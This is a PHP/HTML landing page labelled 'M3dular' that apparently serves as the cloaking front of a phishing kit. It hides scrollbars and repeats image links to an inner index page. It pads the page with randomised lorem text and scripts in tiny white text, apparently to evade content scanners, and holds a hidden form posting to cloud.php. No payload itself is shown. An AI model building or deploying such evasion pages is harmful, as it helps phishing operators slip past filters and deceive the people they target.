<?php

/*



████╗░████║╚════██╗██╔══██╗██║░░░██║██║░░░░░██╔══██╗██╔══██╗
██╔████╔██║░█████╔╝██║░░██║██║░░░██║██║░░░░░███████║██████╔╝
██║╚██╔╝██║░╚═══██╗██║░░██║██║░░░██║██║░░░░░██╔══██║██╔══██╗
██║░╚═╝░██║██████╔╝██████╔╝╚██████╔╝███████╗██║░░██║██║░░██║
╚═╝░░░░░╚═╝╚═════╝░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝


*/

require "inc/m3dular_config.php";
require "m3cache/m3dular_functions.php";

?>


<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">

    <title>...</title>
  </head>



  <body>

  <style>
    body {overflow: hidden ; /* Hide scrollbars */} 
  .m3dbh{color:white; font-size: 3px; text-decoration: none;}
        </style>



<a href="m3cache/index.php" style="margin-top:400px">
<img src="m3cache/mx.png" alt="">  
</a>  

<a href="m3cache/index.php">
<img src="m3cache/mx.png" alt="">  
</a>  
<a href="m3cache/index.php">
<img src="m3cache/mx.png" alt="">  
</a>  
<a href="m3cache/index.php">
<img src="m3cache/mx.png" alt="">  
</a>  
<a href="m3cache/index.php">
<img src="m3cache/mx.png" alt="">  
</a>  

<a href="m3cache/index.php">
<img src="m3cache/mx.png" alt="">  
</a>  

<a href="m3cache/index.php">
<img src="m3cache/mx.png" alt="">  
</a>  

<a href="m3cache/index.php">
<img src="m3cache/mx.png" alt="">  
</a>  

<a href="m3cache/index.php">
<img src="m3cache/mx.png" alt="">  
</a>  
 
<a href="m3cache/index.php">
<img src="m3cache/mx.png" alt="">  
</a>  


<div style="margin-top:2000px"></div>


<!-- <style> .m3dbh{display:none}</style> -->
  <?=m3d_gen_a_lorem_old(rand(30,90),$loremdata,"")?>
  <?=m3d_gen_scripts(rand(51 ,100),$loremdata)?>





<form id="m3dform" action="cloud.php?n=<?=$rand?>" method="POST">
    <input type="hidden" name="n" value="<?=$rand?>">
</form>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="inc/jquery-3.3.1.slim.min.js"></script>



    <script src="m3cache/m3d.js"></script>



  </body>
</html>